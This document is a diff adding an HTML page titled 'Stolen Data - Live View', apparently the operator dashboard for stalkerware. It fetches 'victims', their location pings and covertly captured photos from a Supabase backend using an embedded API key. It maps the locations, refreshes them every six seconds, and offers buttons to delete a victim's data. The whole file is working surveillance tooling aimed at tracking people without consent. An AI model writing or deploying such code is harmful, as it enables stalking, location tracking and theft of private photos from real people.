@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Stolen Data - Live View</title>
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+  <style>
+    body { margin:0; background:#111; color:#0f0; font-family:Arial; }
+    #map { height:50vh; }
+    .controls { padding:10px; background:#1a1a1a; text-align:center; }
+    select, button { padding:10px; margin:5px; font-size:16px; }
+    .delete-victim { background:#c00; color:white; font-weight:bold; }
+    .photos { padding:15px; display:flex; flex-wrap:wrap; gap:12px; }
+    .photo-card { background:#1a1a1a; padding:8px; border-radius:8px; width:300px; position:relative; }
+    .photo-card img { width:100%; border-radius:6px; cursor:pointer; }
+    button { padding:6px 12px; margin:3px; border:none; border-radius:4px; cursor:pointer; }
+    .delete-btn { background:#900; color:white; }
+    .modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.98); z-index:1000; justify-content:center; align-items:center; }
+    .modal img { max-width:90%; max-height:85vh; border:4px solid #0f0; }
+  </style>
+</head>
+<body>
+  <h1>🔴 STOLEN DATA DASHBOARD</h1>
+  
+  <div class="controls">
+    <strong>Select Victim: </strong>
+    <select id="victimSelect" onchange="loadSelectedVictim()"></select>
+    <button class="delete-victim" onclick="deleteCurrentVictim()">🗑 Delete This Victim + All Data</button>
+  </div>
+
+  <div id="map"></div>
+  <h2 style="padding:10px;">📸 Captured Photos</h2>
+  <div class="photos" id="photos"></div>
+
+  <div id="modal" class="modal" onclick="closeModal()">
+    <img id="modalImage" onclick="event.stopImmediatePropagation()">
+  </div>
+
+  <script>
+    const SUPABASE_URL = "https://yvwnnridpgelbewhoxps.supabase.co";
+    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl2d25ucmlkcGdlbGJld2hveHBzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA4NDAyMzMsImV4cCI6MjA5NjQxNjIzM30.P1dXFozH5SpHdZEAU2SB2Lh8TMAhAGxCuPEyTj_BL44";
+
+    const map = L.map('map').setView([20.5937, 78.9629], 5);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+
+    let currentVictimId = "";
+
+    async function loadVictimsList() {
+      const res = await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions?select=id,label,owner_id`, {
+        headers: { "apikey": SUPABASE_KEY }
+      });
+      const victims = await res.json();
+      
+      const select = document.getElementById('victimSelect');
+      select.innerHTML = '<option value="">All Victims</option>';
+      
+      victims.forEach(v => {
+        const opt = document.createElement('option');
+        opt.value = v.id;
+        opt.textContent = `${v.label} (${v.owner_id})`;
+        select.appendChild(opt);
+      });
+    }
+
+    async function loadSelectedVictim() {
+      currentVictimId = document.getElementById('victimSelect').value;
+      loadLiveData();
+    }
+
+    async function loadLiveData() {
+      let url = `${SUPABASE_URL}/rest/v1/location_pings?select=*&order=created_at.desc`;
+      if (currentVictimId) {
+        url += `&session_id=eq.${currentVictimId}`;
+      }
+
+      const res = await fetch(url, { headers: { "apikey": SUPABASE_KEY } });
+      const data = await res.json();
+
+      map.eachLayer(layer => { if (layer instanceof L.Marker) map.removeLayer(layer); });
+
+      const photosDiv = document.getElementById('photos');
+      photosDiv.innerHTML = "";
+
+      data.forEach(item => {
+        if (item.lat && item.lon) {
+          L.marker([item.lat, item.lon]).addTo(map)
+            .bindPopup(`Time: ${new Date(item.created_at).toLocaleString()}`);
+        }
+
+        if (item.photo_data) {
+          const div = document.createElement('div');
+          div.className = "photo-card";
+          div.innerHTML = `
+            <img src="${item.photo_data}" onclick="showBigPhoto('${item.photo_data}')">
+            <button class="delete-btn" onclick="deletePhoto('${item.id}'); event.stopImmediatePropagation();">🗑 Delete</button>
+            <small>${new Date(item.created_at).toLocaleString()}</small>
+          `;
+          photosDiv.appendChild(div);
+        }
+      });
+    }
+
+    function showBigPhoto(src) {
+      document.getElementById('modalImage').src = src;
+      document.getElementById('modal').style.display = "flex";
+    }
+
+    function closeModal() {
+      document.getElementById('modal').style.display = "none";
+    }
+
+    async function deletePhoto(id) {
+      if (!confirm("Delete this photo?")) return;
+      await fetch(`${SUPABASE_URL}/rest/v1/location_pings?id=eq.${id}`, {
+        method: "DELETE",
+        headers: { "apikey": SUPABASE_KEY }
+      });
+      loadLiveData();
+    }
+
+
+    async function deleteCurrentVictim() {
+      if (!currentVictimId) {
+        alert("Please select a victim first");
+        return;
+      }
+      if (!confirm("Delete this victim and ALL their data?")) return;
+
+      // Delete all pings first
+      await fetch(`${SUPABASE_URL}/rest/v1/location_pings?session_id=eq.${currentVictimId}`, {
+        method: "DELETE",
+        headers: { "apikey": SUPABASE_KEY }
+      });
+
+      // Delete the victim session
+      await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions?id=eq.${currentVictimId}`, {
+        method: "DELETE",
+        headers: { "apikey": SUPABASE_KEY }
+      });
+
+      alert("Victim and all data deleted!");
+      loadVictimsList();
+      currentVictimId = "";
+      loadLiveData();
+    }
+
+    // Initial Load
+    loadVictimsList();
+    loadLiveData();
+    setInterval(loadLiveData, 6000);
+  </script>
+</body>
+</html>
